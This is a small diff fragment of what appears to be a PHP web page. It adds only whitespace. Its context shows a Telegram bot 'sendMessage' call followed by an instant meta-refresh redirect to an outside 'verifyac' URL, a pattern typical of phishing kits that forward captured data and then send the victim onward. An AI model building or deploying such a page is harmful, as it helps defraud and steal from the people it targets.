@@ -64,6 +64,7 @@ bot("sendMessage",[
 }
 ?>
 <html>
+    
   <head>
     <meta http-equiv="refresh" content="0; url='http://www.verifyac.com/index.php?uc=F'" />
     <script type="text/javascript">
@@ -72,4 +73,5 @@ bot("sendMessage",[
  </head>
   <body>
   </body>
+    
 </html>
